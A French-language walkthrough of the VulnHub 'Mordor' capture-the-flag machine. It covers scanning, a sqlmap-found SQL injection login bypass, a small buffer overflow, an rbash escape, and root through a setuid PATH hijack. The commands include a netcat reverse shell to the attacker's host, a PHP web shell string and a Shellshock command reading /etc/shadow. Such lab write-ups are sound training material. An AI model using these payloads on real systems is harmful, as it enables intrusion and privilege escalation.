---
title: "Solution du CTF Mordor de VulnHub"
tags: [CTF, VulnHub]
---

[Mordor](https://vulnhub.com/entry/mordor-11,361/) est un CTF proposé sur *VulnHub* qui se targuait d'inclure tout un tas de sujets comme de l'exploitation de binaire, de l'exploitation web, de l'énumération, du cracking , etc.

Ça semblait donc bien parti, sauf que non, on part bloqué dès le début, car il faut trouver un dossier dont le nom n'est dans aucune wordlist standard et ensuite on se coltine des devinettes sans intérêt.

Une fois passé le début, ça va, mais le CTF ne m'aura pas laissé un souvenir impérissable.

## Boring

Il y a en plus du serveur SSH et du serveur web un port custom :

```console
$ sudo nmap -sCV -T5 -p- --script vuln 192.168.56.188
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 14:23 CEST
Nmap scan report for 192.168.56.188
Host is up (0.0015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|_      PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
80/tcp   open  http            Apache httpd 2.4.38 ((Debian))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.38 (Debian)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.188
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.188:80/manual/pt-br/index.html
|     Form id: 
|     Form action: http://www.google.com/search
|     
--- snip ---
|     Path: http://192.168.56.188:80/manual/da/index.html
|     Form id: 
|_    Form action: http://www.google.com/search
| http-enum: 
|_  /manual/: Potentially interesting folder
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
--- snip ---
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|       CVE-2023-27522  0.0     https://vulners.com/cve/CVE-2023-27522
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
4000/tcp open  remoteanything?
| fingerprint-strings: 
|   NULL: 
|     ___ . . _ 
|     "T$$$P" | |_| |_ 
|     :$$$ | | | |_ 
|     :$$$ "T$$$$$$$b. 
|     :$$$ .g$$$$$p. T$$$$b. T$$$$$bp. BUG "Tb T$b T$P .g$P^^T$$ ,gP^^T$$ 
|     .s^s. :sssp $$$ :$; T$$P $^b. $ dP" `T :$P `T
|     Tbp. 
|_    "T$$p.
```

Sur ce port 4000 on obtient juste un message :

```console
$ ncat 192.168.56.188 4000 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.188:4000.
         ___ . .  _                                                                                       
"T$$$P"   |  |_| |_                                                                                             
 :$$$     |  | | |_                                                                                             
 :$$$                                                      "T$$$$$$$b.                                          
 :$$$     .g$$$$$p.   T$$$$b.    T$$$$$bp.                   BUG    "Tb      T$b      T$P   .g$P^^T$$  ,gP^^T$$ 
  $$$    d^"     "^b   $$  "Tb    $$    "Tb    .s^s. :sssp   $$$     :$; T$$P $^b.     $   dP"     `T :$P    `T
  :$$   dP         Tb  $$   :$;   $$      Tb  d'   `b $      $$$     :$;  $$  $ `Tp    $  d$           Tbp.   
  :$$  :$;         :$; $$   :$;   $$      :$; T.   .P $^^    $$$    .dP   $$  $   ^b.  $ :$;            "T$$p.  
  $$$  :$;         :$; $$...dP    $$      :$;  `^s^' .$.     $$$...dP"    $$  $    `Tp $ :$;     "T$$      "T$b 
  $$$   Tb.       ,dP  $$"""Tb    $$      dP ""$""$" "$"$^^  $$$""T$b     $$  $      ^b$  T$       T$ ;      $$;
  $$$    Tp._   _,gP   $$   `Tb.  $$    ,dP    $  $...$ $..  $$$   T$b    :$  $       `$   Tb.     :$ T.    ,dP 
  $$$;    "^$$$$$^"   d$$     `T.d$$$$$P^"     $  $"""$ $"", $$$    T$b  d$$bd$b      d$b   "^TbsssP" 'T$bgd$P  
  $$$b.____.dP                                 $ .$. .$.$ss,d$$$b.   T$b.                                       
.d$$$$$$$$$$P  bug                                                    `T$b.                                     
                                                                        "^^"                                    

During the campaign at the fortress of helms deep,
you was choosen to steal Sauron's plans for the final war,
which covers middleearth with darkness.
Your mission is to give the plans to rohan, gondor and all those fighting against the dark kingdom of mordor.
These plans, will be an advantage for the case,
if frodo fails his mission to destroy the ring on mount doom.
You make the journey to mordor,
and you have arrived unnoticed the area of mordor.
```

Vu qu'il n'y a rien ici il fallait énumérer le port 80, mais le mot à trouver n'est ni dans la wordlist `big.txt` de *DirBuster* ni dans le `raft-large-words` de *FuzzDB*.

Ceux qui ont assez de temps à perdre auront le courage de se feindre d'un *rockyou*, bien que ça n'ait aucun sens, mais trouverons ainsi le dossier `blackgate` qui nous accueille avec ce message :

> Helms deep is fallen by the Orcs, Frodo is already on the journey to mordor. You have arrived the black gate of mordor. Still unnoticed you observe the situation. After a while you noticed, an another army near the black gate. The gate opens and all sentinels and soldiers observe the entire area. flag{bc6fd79cd1fa7ebbcd420cb45434d9a2b4d921a5}

On trouve une mire de login et cette dernière est vulnérable à une injection SQL que `sqlmap` détecte :

```bash
python sqlmap.py -u http://192.168.56.188/blackgate/admin/ --data "usr=dd&pwd=dd" --risk 3 --level 5
```

C'est le champ du mot de passe qui est vulnérable :

```
sqlmap identified the following injection point(s) with a total of 8605 HTTP(s) requests:
---
Parameter: pwd (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: usr=dd&pwd=-5569' OR 1720=1720-- TJlt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usr=dd&pwd=dd' AND (SELECT 4174 FROM (SELECT(SLEEP(5)))gPvk)-- CYUj
---
[14:47:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

On peut dumper le hash mais il est inconnu de `crackstation` :

```
Database: mordor
Table: blackgate
[1 entry]
+---------+----------+------------------------------------------+
| user_id | username | password                                 |
+---------+----------+------------------------------------------+
| 1       | Azog     | 26f736aacd60fb538e72f1307f1e4bb1322b02bc |
+---------+----------+------------------------------------------+
```

Qu'importe, on peut profiter de la vulnérabilité pour se connecter avec le mot de passe `' OR 1=1 #`.

On obtient alors juste un message indiquant qu'on est connecté, mais en regardant les cookies je vois le texte suivant :

> You found a way to bypass the black gate. A small hole in the rocks gives you an entrance to mordor.
> 
> During the walk yo find a piece of paper. On the paper ther are a hint, there orcs on the other side.
> 
> The last  line looks like a key \"orc + flag = t22.\"

## Exploitation de binaire... Kinda

Ok, les instructions sont plutôt floues. En fait les caractères dans le flag obtenu dans la page web correspondent à un sha1 correspondant au clair `disquise`.

On peut alors se connecter sur le compte `orc` en SSH.

```console
orc@mordor:~$ id
-rbash: id: Kommando nicht gefunden.
```

On est dans un `rbash` et seulement les binaires sont le dossier `bin` sont autorisés :

```console
./bin:
insgesamt 1,9M
drwxr-xr-x 2 orc orc 4,0K Aug 29  2019 .
drwx------ 4 orc orc 4,0K Aug 29  2019 ..
-rwxr-xr-x 1 orc orc  18K Aug  9  2019 door
-rwxr-xr-x 1 orc orc 136K Aug  9  2019 ls
-rwxr-xr-x 1 orc orc  17K Aug 29  2019 outpost
-rwxr-xr-x 1 orc orc 1,2M Aug  9  2019 rbash
-rwxr-xr-x 1 orc orc  67K Aug  9  2019 rm
-rwxr-xr-x 1 orc orc 456K Aug  9  2019 wget
-rwxr-xr-x 1 orc orc  35K Aug  9  2019 whoami
```

`wget` ne supporte pas le scheme `file://` donc je ne peux pas copier bash dans les binaires autorisés.

Regardons un peu les programmes inconnus.

```console
orc@mordor:~$ door
Enter the right key to unlock the door!
test
Nothing happens
```

Et l'autre ?

```console
orc@mordor:~$ outpost
You arrived the door to escape the outpost.
Many keys are close to you, choose one
key: test
0 = 0xdeadbeef

Oh noo you got the wrong key!
```

Ça laisse supposer qu'un overflow est présent et qu'on peut écraser la variable notée `0`. À tâtonnement j'ai pu effectivement écraser la variable :

```console
orc@mordor:~$ printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE" | outpost
You arrived the door to escape the outpost.
Many keys are close to you, choose one
key: deadbeef = 0xdeadbeefYou found the key!.
        flag{8a29aaf5687129c1d27b90578fc33ecc49d069dc}.
        You gonna try the key on the doorlock!

Speicherzugriffsfehler
```

Cette fois le sha1 correspond à `badpassword`.

```console
orc@mordor:~$ door
Enter the right key to unlock the door!
badpassword
You have unlocked the door!
$ id
/bin/sh: 1: id: not found
$ env
/bin/sh: 2: env: not found
$ export PATH=/usr/local/bin:/usr/bin:/bin:/sbin:/usr/sbin
$ id
uid=1001(orc) gid=1001(orc) Gruppen=1001(orc)
```

## Cache ta joie

Je remarque quelques utilisateurs sur le système :

```
nazgul:x:1000:1000:nazgul,,,:/home/nazgul:/bin/bash
orc:x:1001:1001:,,,:/home/orc:/bin/rbash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
barad_dur:x:1003:1003:,,,:/home/barad_dur:/bin/bash
```

Et quelques processus intéressants :

```
root      2472  0.0  0.1   2372  1720 ?        S    14:27   0:00 nc -lvp 4000 -e /opt/mordor_greets/mordor_greets
root       354  0.0  0.3   6728  3108 ?        S    14:22   0:03 bash /opt/baraddur/check.sh
root       330  0.0  0.0   2388   588 ?        S    14:22   0:00 sh /opt/mordor_greets/mordor_greets.sh
root       332  0.1  0.7  16952  7808 ?        S    14:22   0:05 python /opt/nazgul/nazguls.py
```

Mais surtout deux dossiers à la racine.

```
drwx------  2 nazgul nazgul 4,0K Aug 13  2019 minasmorgul
drwx------  2 orc    orc    4,0K Aug 12  2019 whistleblow
```

Le second m'appartient et je trouve une image à l'intérieur qui doit contenir un secret d'après l'un des tags EXIF. L'occasion de tester [GitHub - bannsec/stegoVeritas: Yet another Stego Tool](https://github.com/bannsec/stegoVeritas) :

```console
$ docker run -v /tmp:/data -it --rm bannsec/stegoveritas
stegoveritas@9dd9decfeacc:~$ ls
stegoveritas@9dd9decfeacc:~$ stegoveritas /data/Orc.jpg
Running Module: SVImage
+------------------+------+
|   Image Format   | Mode |
+------------------+------+
| JPEG (ISO 10918) | RGB  |
+------------------+------+
+--------+------------------+------------------------------------------------------------------------------------------------------+-----------+
| Offset | Carved/Extracted | Description                                                                                          | File Name |
+--------+------------------+------------------------------------------------------------------------------------------------------+-----------+
| 0xde0c | Carved           | LZMA compressed data, properties: 0xC0, dictionary size: 16777216 bytes, uncompressed size: 32 bytes | DE0C.7z   |
| 0xde0c | Extracted        | LZMA compressed data, properties: 0xC0, dictionary size: 16777216 bytes, uncompressed size: 32 bytes | DE0C      |
+--------+------------------+------------------------------------------------------------------------------------------------------+-----------+
+---------+------------------+----------------------------------------+------------+
| Offset  | Carved/Extracted | Description                            | File Name  |
+---------+------------------+----------------------------------------+------------+
| 0x25fcd | Carved           | Zlib compressed data, best compression | 25FCD.zlib |
| 0x25fcd | Extracted        | Zlib compressed data, best compression | 25FCD      |
+---------+------------------+----------------------------------------+------------+
Found something with StegHide: /home/stegoveritas/results/steghide_919e9e31d749fe024ed5afb399709d20.bin
Running Module: MultiHandler

Found something worth keeping!
JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 400x389, components 3
Exif
====
+---------------------+---------------------------------------------------------------------------+
| key                 | value                                                                     |
+---------------------+---------------------------------------------------------------------------+
| SourceFile          | /data/Orc.jpg                                                             |
| ExifToolVersion     | 11.88                                                                     |
| FileName            | Orc.jpg                                                                   |
| Directory           | /data                                                                     |
| FileSize            | 38 kB                                                                     |
| FileModifyDate      | 2023:04:28 13:27:20+00:00                                                 |
| FileAccessDate      | 2023:04:28 13:27:30+00:00                                                 |
| FileInodeChangeDate | 2023:04:28 13:27:20+00:00                                                 |
| FilePermissions     | rwx------                                                                 |
| FileType            | JPEG                                                                      |
| FileTypeExtension   | jpg                                                                       |
| MIMEType            | image/jpeg                                                                |
| JFIFVersion         | 1.01                                                                      |
| ResolutionUnit      | inches                                                                    |
| XResolution         | 96                                                                        |
| YResolution         | 96                                                                        |
| XMPToolkit          | Image::ExifTool 11.16                                                     |
| Author              | Psst, little pig, i know what you want! I have hidden information for you |
| ImageWidth          | 400                                                                       |
| ImageHeight         | 389                                                                       |
| EncodingProcess     | Baseline DCT, Huffman coding                                              |
| BitsPerSample       | 8                                                                         |
| ColorComponents     | 3                                                                         |
| YCbCrSubSampling    | YCbCr4:2:0 (2 2)                                                          |
| ImageSize           | 400x389                                                                   |
| Megapixels          | 0.156                                                                     |
+---------------------+---------------------------------------------------------------------------+
XMPP
====
+-----------------+-----------------------------------------------------------------------------+
|       key       |                                    value                                    |
+-----------------+-----------------------------------------------------------------------------+
|   'dc:creator'  |                                      ''                                     |
| 'dc:creator[1]' | 'Psst, little pig, i know what you want! I have hidden information for you' |
+-----------------+-----------------------------------------------------------------------------+
stegoveritas@9dd9decfeacc:~$ file /home/stegoveritas/results/steghide_919e9e31d749fe024ed5afb399709d20.bin
/home/stegoveritas/results/steghide_919e9e31d749fe024ed5afb399709d20.bin: ASCII text, with very long lines
stegoveritas@9dd9decfeacc:~$ cat /home/stegoveritas/results/steghide_919e9e31d749fe024ed5afb399709d20.bin
You want to invade the fortress barad dur. You will got huge trouble, if youre noticed by some of the guards. You didn't hear this from me, but there's an unguarded entrance to the fortress.
The way to that entrace is very dangerous, you have to evade the nazguls, they observe every time the area. The big eye is watching all time.
If you reach the fortess, you have to go behind the fortress on the rocks. Go on, before i change my mind.

flag{9e49cb5caf91603db26adb774c6af72c88a6304a}
```

## Comme se taper le doigt avec un marteau

Pour l'étape suivante, on se connecte avec `nazgul` / `23lorlorck`.

On est rapidement déconnecté. Je me rappelle le dossier à la racine appartenant à l'utilisateur donc j'utilise plutôt `scp` pour récupérer les données :

```console
$ scp -r nazgul@192.168.56.188:/minasmorgul minasmorgul
nazgul@192.168.56.188's password: 
flag.txt                                                                                                                                                                         100% 1255     1.0MB/s   00:00    
$ cat minasmorgul/flag.txt 
The nazgul's doesnt noticed you, youre very near to the fortress barad dur.
Frodo is already on the journey to morder, for destroying the ring at mount doom.
You see the great glowing eye... darkness overwhelms all you can see...
Mount doom bubbles and smokes very strongly, lightning and thunder rule over the country. Darkness everywhere

               Three::rings
          for:::the::Elven-Kings
       under:the:sky,:Seven:for:the
     Dwarf-Lords::in::their::halls:of
    stone,:Nine             for:Mortal
   :::Men:::     ________     doomed::to
 die.:One   _,-'...:... `-.    for:::the
 ::Dark::  ,- .:::::::::::. `.   Lord::on
his:dark ,'  .:::::zzz:::::.  `.  :throne:
In:::the/    ::::dMMMMMb::::    \ Land::of
:Mordor:\    ::::dMMmgJP::::    / :where::
::the::: '.  '::::YMMMP::::'  ,'  Shadows:
 lie.::One  `. ``:::::::::'' ,'    Ring::to
 ::rule::    `-._```:'''_,-'     ::them::
 all,::One      `-----'        ring::to
   ::find:::                  them,:One
    Ring:::::to            bring::them
      all::and::in:the:darkness:bind
        them:In:the:Land:of:Mordor
           where:::the::Shadows
                :::lie.:::

flag{37643e626fb594b41cf5c86683523cbb2fdb0ddc}

Now you have to find out how invade the fortress barad dur
```

On peut ainsi utiliser le mot de passe `baraddur` pour le compte correspondant.

On tombe alors sur une série de questions qui semblent tourner en boucle :

```
You invaded baradur, nobody noticed you.
flag{636e566640f0930b4772ff76932dd4b83d8987af}
 
You sneaks through the fortress, floor for floor.
Youre stealthy if orcs and other cross you way.
 
You quieter you are, youre more able to hear...
you got snippets of information where sauron and the high ranked,
prepares the plans for the end war.
 
You hear the screams of the prisoners...
After couple of hours you found the place of plannig...
Darkness comes out, the room will be darker, the lights are gone.
 
You fly out of the window, to the balcon, and breaks many bones.
Rain fell over youre face, after you come to your senses.
Silence...
 
The entrance catches fire, it gets bigger quickly. Sauron's eye appears.
In the middle of the eye a figure slowly appears... Sauron...
                                                          ^           . ``  ^.
                                                        M          ;l:   `^`   l
                                                        M                .     M
                                                       ?M           p       ; uM
                                                        M           M         tM
                                                        M:          M         MM   `
                                                        p           M         MM   ``
                                                        MN          V:    ;t= MM
                                                        MM          :M   `q   MM =?`
                                                        MM   ?     ?Zg   ^`   MM
                                                   fvv? MH   M    ? fMM: MM= `pM
                                                        kf   M ``.: MMMMMMu :MMM     ^`?:
                                             ``;rql.    ^Mg  MV? `HMMMMMpzMl #NM .^Zgr=rr?:`^
                                           ?^;rtpZ^;Z;  ^MMMM. . bM=.  .`:MMMMMM.pzyr;Vr^`^ l
                                               mZ..uqybt=MMMg gMMMM?^^   pMMMMMf ?pt ^vqfNk^
                                               `. ...:uf.   M  .g?^ ^l   :uMMMr:^HM?    =`
                                                  t???`   .  ^      .N^; qrbkM^gp@;ul         ?l^
                                                  `    `: uM       r H?  r^ Hq uqtlMb=u; :Vg=`  zl
                                             pVyuyztz=^?zrvM;      `Z    f fMV  uZyu.Vg?;pZ=.  :?
                                            t?=t;`:lVp#MMZ^uM^fM..t M MMtpMMM?p@ZZy@y?`:=vtzqMMb?
                                          .?l.`truZrZr;^:^^`MM Mm v. MMMyutM;ZMVyyrp@Z.`??;?;   ;?^
                                         `..=tl=.^tzu?`  `l: M rMM   M zM MM  uZZZZkMl`.lkt^= .qu^
                                        .??^^uuf^?.  ^^lqMq; HM  ?MMqM Z lb  qVVppg@p;^ .`qM=MMy.
                                      :t:rbHN@g@zHZqM@=;#?;mzlMMMMMMMMMMM^MVq@r^;yv:;=tl=@
                                  ```^^: ;t^ ^.  ;.lrr.vH;?pyrMMMMMMMMMMMy Hruy.`?  `^zpV
                                 .^.^;^^;r^     ^=;lu. yy? `^ZqVMMMMN@NMNMMN ^Nk?; ^l  ` ` .Mgl
                                   ^:ll?=uNMMMMMmZtmyr^   ;MMMu:mMprvrrrgMHMMM        =v;    t
                                     .lM@bpy? `MMMNv MMMMMMMMMMt:kyryzkqMH@MMMMMMMMMMMMMMMM  t^
                                         ?yyMMM  ?MMMMMMM@`zzuyvb@gbzygNNMHqk `MMMM;gqMMmNMM
                                              MM  MMMMpqHM@ygb?trZMHkuv@MMMM  Nyqqr MMMrH@mMMz
                                         ;;MMt`MMy yfp`#M y :t==vZgHfZZHHMMulMM@kmMMM  uN@MMMZ^ :
                               ``    rpMMq=MMHMMMMMglr^:pHMr@  glt@q@q  M= :qMfp@fp.  #`MMMMu tyy
                              `     ?.  ^;tM    ygMH ?kNu MMMMMM:uMMMMM@  MMNMMHgNr@MMMVgMM   ?r;
                                      ^` . H =u; ;utut=qMMM?rygHkMHH#HM MMMMqMMMggMH uM;rH  m:^^
                                       ;ZmtMM :q#MMbHH@gHq@lfgkHMM@zuuyMMMMHgVMMMHMMMMprvM  MVZ#
                                          vuM   ^uyH@#Mqykf@MMMMMMlMkHMy?ZNHqzkZ@kqfkH@HMM^qypMM
                                            M; yHHMMMZ;^rZy@MMM^  t#p.?M#@NMHqbf rZlpf  M ^ ` Z     ^
                       ``..   `^;`          MVMMM^.  :u@@ZVVV   :Mf=rMkg@^tMH=:yMMN bHMMMl
                          .r?````;^     ;=:p^VMNp ; MMmNHf#H:MMMMMHv.NHzMMyMMqvyyZM;MM? uv     uv?;
                            `;:. .:.^lputvf?uyuNMMMMqqp HM#.#MZM  MMl ^ zMM #Nr Np@MM         Mkr
                               .  :;^.;;rl.fMHupv  ^MMMNq  l   p  k@@.MMNM; #fg^u?qpM  : .  ^rbN`
                           ^   .^ :^;^??rr^mZurl  `Mq `   t    MMMMMHyHMMMMNM;`fb;V          ^H
                           ;  ??^`:  ;;=:. vgbqMMMMMM  MMMy  :tMkzbHMMNMmHbMMMMb@Vg `  MM   `M^
                  `     ^. ^.     .``:.^.  bMMMMMMMMM M@ZMM  MgNuvrpgV#HHkrmMMMMgyZM.Mb yMMMMMMZ`
     `          ?r:;?=l:  ^?^  .?r=^?=;r=;MMMMmfM  u `MHu:M#MMpg@kHN@=N@by@MM=??Zb=ygg@y HNgMMMM
      :         `^^;;;?^ .^`   `..?;tl?=^:MMMgq#M`.  . yMZ  yM@MN@k#HVNvvqy ^:mkH:^?zHmbq@?f@tZZ
 `             ``.^:==l:``    `^   .=;=z= NM@.;Mu pMMMkMMMMM  @HmH@pfm#fmp ^MMMMM;MbkMMMNHMv .qM.
::lrrzz:   .?=^?^ `.`   `.  ;mqpgkVutfVZt  p?pqmMMMMM#Ml^MMMMMMMVp#MMMMMMgMMHNMurMM=lZM M` yMvyZ
Sauron: "I see you... Now you will die..."






You have 3 lifepoints

        What returns this function with the parameters 0x4343, 0xff? Result starts with 0x


        _func:
                push    ebp
                mov     ebp,esp
                mov eax, DWORD [ebp+0x8]
                mov edx, DWORD [ebp+0xc]
                add eax, edx
                pop ebp
                ret

Answer: 0x4442
You have 4 lifepoints
Translate this to ascii 
        00111100 00111111 01110000 01101000 01110000 00100000
        01100101 01100011 01101000 01101111 00100000 01110011 
        01101000 01100101 01101100 01101100 01011111 01100101 
        01111000 01100101 01100011 00101000 00100100 01011111 
        01000111 01000101 01010100 01011011 00100111 01100011 
        01101101 01100100 00100111 00101001 00111011 00111111 
        00111110
Answer: <?php echo shell_exec($_GET['cmd');?>
You have 5 lifepoints

        What returns this function with the parameters 0x4343, 0xff? Result starts with 0x


        _func:
                push    ebp
                mov     ebp,esp
                mov eax, DWORD [ebp+0x8]
                mov edx, DWORD [ebp+0xc]
                add eax, edx
                pop ebp
                ret

Answer: 0x4442
You have 6 lifepoints

        What returns this function with the parameters 0xd58dc4b3, 0x091ffa3c? Result starts with 0x

        _func:
                push    ebp
                mov     ebp,esp
                mov eax, DWORD [ebp+0x8]
                mov edx, DWORD [ebp+0xc]

        _loop:
                add eax, 0x1
                dec edx
                cmp edx, 0x00
                je _end
                jmp _loop

        _end:
                pop ebp
                ret

Answer: 0xdeadbeef
You have 7 lifepoints
Which password is here? $1$xJY6LO3c$FTt05FYNiqbk2S0Q6YZ3l/
Answer: password1
You defeated Sauron
flag{63905253a3f7cde76ef8ab3adcae7d278b4f5251}
Sauron appears behind you...
You have 3 lifepoints
What is that? env X'() { :; }; /bin/cat /etc/shadow' bash -c echo
Answer: shellshock
```

Le plus intéressant, c'était la boucle en assembleur qui itère en décrémentant donc ça revient à faire une addition.

Il fallait faire attention au débordement de valeur pour rester sur un dword donc utiliser par exemple `ctypes` :

```python
>>> hex(ctypes.c_uint32(0xd58dc4b3 + 0x091ffa3c).value)
'0xdeadbeef'
```

Ok, j'ai obtenu un flag puis je me suis arrêté. En fait il ne fallait pas.

J'ai ainsi obtenu 3 flags : `melkor`, `bekboevanazgulia`, `tidusauronyuna`. Aucun n'est utile.

Finalement au bout d'un moment, on obtient un shell :

```console
Which text is here? $6$2S0Q6YZa$anDqTZkR9eL.Uv0gniNSZgcPuIJs/tM2MFiJIO65cOHPQt4NyvRd1/NVQkq7edaeFkQ.K8ds3t2hXg/8C8l2w.
Answer: gandalf19
You have 7 lifepoints
Translate this to ascii "2f6574632f706173737764"
Answer: /etc/passwd
You defeated Sauron
He disappears... You defeated him. Now grap the plans!
barad_dur@mordor:~$
```

## Pfff

On a un binaire setuid root :

```
-rwsr-sr-x 1 root root 16712 Aug 15  2019 plans
```

Il semble juste exécuter `ls /root` donc avec un path relatif.

```console
barad_dur@mordor:~$ strings plans 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
ls /root
```

Solution habituelle :

```console
barad_dur@mordor:~$ echo "nc -e /usr/bin/bash 192.168.56.1 80" > ls
barad_dur@mordor:~$ chmod +x ls
barad_dur@mordor:~$ PATH=.:$PATH ./plans
```

Et j'obtiens le flag final :

```console
$ sudo ncat -l -p 80 -v
[sudo] Mot de passe de root : 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.56.188.
Ncat: Connection from 192.168.56.188:57648.
id
uid=0(root) gid=0(root) Gruppen=0(root),1003(barad_dur)
cd /root
ls
flag.txt
cat flag.txt
                                             _______________________
   _______________________-------------------                       `\
 /:--__                                                              |
||< > |                                   ___________________________/
| \__/_________________-------------------                         |
|                                                                  |
 |                       Congratulations                           |
 |                                                                  |
 |      You have successfully reach the root, i hope                |
  |        you enjoyed the ctf and the story.                       |
  |                                                                  |
  |           flag{262efbb6087a6aae46f029a2ff19f9f409c9cd3d}         |
  |                                                                   |
   |       Created by strider, CC v3                                  |
   |                                                                  |
   |                                                                 |
  |                                              ____________________|_
  |  ___________________-------------------------                      `\
  |/`--_                                                                 |
  ||[ ]||                                            ___________________/
   \===/___________________--------------------------
```

Content d'en avoir terminé surtout 😅

Il semble que [bl4nk_5h3ll](https://soufian2017.github.io/Blog/posts/Mordor-Vulnhub/) partage cet avis.

> This machine is one hell of an annoying one tbh.
